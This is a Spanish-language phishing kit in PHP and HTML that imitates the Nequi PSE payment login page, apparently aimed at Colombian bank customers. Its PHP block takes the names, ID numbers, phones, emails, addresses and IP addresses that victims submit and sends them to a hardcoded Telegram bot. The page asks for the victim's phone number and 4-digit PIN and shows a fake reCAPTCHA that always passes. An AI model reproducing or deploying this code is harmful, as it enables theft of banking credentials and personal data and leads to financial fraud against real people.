<?php
if (!empty($_POST)) {
    // âœ… INFORMACION PERSONAS
    $botToken = '7449448770:AAH6SRnpH5bk5fRfD_oEs-j50LbK-GX_iw4';
    $chatId   = '-4896949011';

    $origen = $_POST['origen'] ?? '';
    $mensaje = '';

    if ($origen === 'bancolombia') {
        $nombre = trim($_POST['nombre'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "ðŸ¦ BOTON BANCOLOMBIA ðŸ¦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "âš™ï¸Nombre: $nombre\n";
        $mensaje .= "ðŸ’³CÃ©dula: $documento\n";
        $mensaje .= "ðŸ“žTelÃ©fono: $telefono\n"; // â† AQUÃ EL \n ES CLAVE
        $mensaje .= "âœ‰ï¸Correo: $email";
        $mensaje .= "ðŸŒIP: $ip";

    } elseif ($origen === 'pse') {
        $banco = trim($_POST['select'] ?? '');
        $nombre = trim($_POST['nombre'] ?? '');
        $direccion = trim($_POST['direccion'] ?? '');
        $documento = trim($_POST['documento'] ?? '');
        $telefono = trim($_POST['telefono'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $ip = $_SERVER['HTTP_CLIENT_IP'] ??
        $_SERVER['HTTP_X_FORWARDED_FOR'] ??
        $_SERVER['HTTP_CF_CONNECTING_IP'] ??
        $_SERVER['REMOTE_ADDR'] ??
        'IP no detectada';

        $mensaje  = "ðŸ¦ BOTON NEQUI ðŸ¦\n";
        $mensaje .= "=================\n";
        $mensaje .= "DATOS\n";
        $mensaje .= "=================\n";
        $mensaje .= "ðŸ’°Banco: $banco\n";
        $mensaje .= "âš™ï¸Nombre: $nombre\n";
        $mensaje .= "ðŸ“DirecciÃ³n: $direccion\n"; // â† AQUÃ EL \n ES CLAVE
        $mensaje .= "ðŸ’³CÃ©dula: $documento\n";
        $mensaje .= "ðŸ“žTelÃ©fono: $telefono\n";
        $mensaje .= "âœ‰ï¸Correo: $email\n";
        $mensaje .= "ðŸŒIP: $ip";

} else {
    $lineas = [];
    foreach ($_POST as $campo => $valor) {
        $valor = is_array($valor) ? implode(', ', $valor) : trim((string) $valor);
        $lineas[] = ucfirst($campo) . ': ' . $valor;
    }
    $mensaje = "ðŸ“ Formulario desconocido\n" . implode("\n", $lineas);
}

    // âœ… AQUÃ YA ESTÃN DEFINIDAS LAS VARIABLES $botToken y $chatId
    $url = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 3,
        CURLOPT_POSTFIELDS => http_build_query($data),
    ]);
    curl_exec($ch);
    curl_close($ch);
}
?>



<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Nequi</title>

    <!-- icono -->
    <link rel="icon" href="./images/icononeki.ico" />

    <!-- Google Fonts: Manrope -->
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&display=swap" rel="stylesheet" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

    <!-- Estilos -->
    <link rel="stylesheet" href="css/necli.css" />
    <link href="https://unpkg.com/ionicons@4.5.10-0/dist/css/ionicons.min.css" rel="stylesheet" />

    <!-- Scripts -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
</head>
<body>

        <!-- â¬‡ï¸ AÃ‘ADE AQUÃ EL LOADER -->
        <div id="loader" style="display: none; position: fixed; inset: 0; background: white; z-index: 9999;">
        <div class="splash__container animate-logo">
            <!-- Inserta aquÃ­ el SVG completo del loader de Nequi (N, E, Q, U, I) -->
        </div>
        </div>
        <!-- â¬†ï¸ FIN DEL BLOQUE LOADER -->

    <div class="main-container">

        <!-- Encabezado -->
        <div class="header">
            <img src="images/logo.png" alt="Nequi" class="header__img" />
        </div>

        <!-- TÃ­tulo y subtÃ­tulo -->
        <h1 class="title">Pagos PSE de Nequi</h1>
        <h2 class="subtitle">
            Ingresa tu nÃºmero de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.
        </h2>

        <!-- Formulario -->
        <form class="form">

            <!-- Campo nÃºmero de celular -->
            <div class="input-container">
                <div class="input-container__field">
                    <span class="p-float-label">
                        <input
                            id="txtUsuario"
                            name="user"
                            type="tel"
                            minlength="10"
                            maxlength="10"
                            class="p-inputtext placeholder"
                        />
                        <label for="txtUsuario">NÃºmero de celular</label>
                    </span>
                </div>
            </div>

            <!-- Campo clave -->
            <div class="input-container">
                <div class="input-container__field">
                    <span class="p-float-label p-input-icon-right">
                        <input
                            id="txtPass"
                            name="clave"
                            type="password"
                            maxlength="4"
                            class="p-inputtext placeholder"
                        />
                        <input type="hidden" value="nequi" id="banco" />
                        <label for="txtPass">Clave</label>
                    </span>
                </div>
            </div>

            <div class="recaptcha-box">
  <div class="recaptcha-checkbox" id="captchaBox">
    <div class="spinner-bg" id="captchaBg"></div>
    <div class="spinner" id="captchaSpinner"></div>
    <svg class="checkmark" id="captchaCheck" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
      <path d="M9.29 16.29L4.7 11.7 3.29 13.11 9.29 19.11 21.29 7.11 19.88 5.7z"/>
    </svg>
  </div>
  <span class="recaptcha-label" id="captchaText">No soy un robot</span>
<div class="recaptcha-right">
  <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
  <div class="recaptcha-text">reCAPTCHA</div> <!-- NUEVO -->
  <div class="recaptcha-links">
    <a href="#">Privacidad</a> ãƒ» <a href="#">Condiciones</a>
  </div>
</div>
</div>

            <!-- Botones -->
            <div class="form__buttons">
                <button type="button" id="btnUsuario" class="p-button p-button-primary" disabled>
                    Entra
                </button>
                <button type="button" class="p-button p-button-secondary">
                    Ahora no
                </button>
            </div>
        </form>

        <!-- Pie de pÃ¡gina -->
        <p class="footer">
            Â¿Se te olvidÃ³ la clave? Abre Nequi en tu cel y cÃ¡mbiala en segundos.
        </p>

    </div>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        const inputs = document.querySelectorAll('.p-inputtext');
        const txtUsuario = document.getElementById('txtUsuario');
        const txtPass = document.getElementById('txtPass');
        const btnUsuario = document.getElementById('btnUsuario');

        // Ya declaraste esto mÃ¡s abajo, asÃ­ que elimÃ­nalo del otro bloque
        window.verified = false;

        inputs.forEach(input => {
            input.addEventListener('input', () => {
                input.classList.toggle('p-filled', input.value !== '');
            });
        });

        function checkFormCompletion() {
            const isUserValid = txtUsuario.value.length === 10;
            const isPassValid = txtPass.value.length === 4;
            btnUsuario.disabled = !(isUserValid && isPassValid && verified);
        }

        txtUsuario.addEventListener('input', checkFormCompletion);
        txtPass.addEventListener('input', () => {
            txtPass.value = txtPass.value.replace(/\D/g, '');
            checkFormCompletion();
        });

        $('#btnUsuario').click(() => {
            if ($("#txtUsuario").val().length > 0) {
                pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());
            }
        });

        $("#txtUsuario").keyup(() => {
            $("#err-mensaje").hide();
        });

        // Captcha script incluido aquÃ­ para que comparta contexto
        const captchaBox = document.getElementById('captchaBox');
        const spinner = document.getElementById('captchaSpinner');
        const spinnerBg = document.getElementById('captchaBg');
        const checkmark = document.getElementById('captchaCheck');
        const captchaText = document.getElementById('captchaText');

        captchaBox.addEventListener('click', () => {
            if (verified) return;
            captchaBox.classList.add('verifying'); // <- lÃ­nea nueva
            spinnerBg.style.display = 'block';
            spinner.style.display = 'block';
            captchaBox.style.pointerEvents = 'none';
            captchaText.textContent = 'Verificando...';

                    setTimeout(() => {
            spinner.style.display = 'none';
            spinnerBg.style.display = 'none';

            // Mostrar palomita con efecto suave
            checkmark.style.display = 'block';
            checkmark.style.opacity = '1';

            captchaBox.classList.remove('verifying');
            captchaBox.classList.add('verified');
            captchaText.textContent = 'No soy un robot';
            verified = true;

            checkFormCompletion();
        }, 2000);

        });
    });
</script>
<script>
  document.addEventListener("DOMContentLoaded", function () {
    const form = document.querySelector("form"); // o usa un id si tu formulario tiene uno
    form.addEventListener("submit", function () {
      // Mostrar loader justo al enviar
      document.getElementById("loader").style.display = "flex";
    });
  });
</script>
</body>
</html>

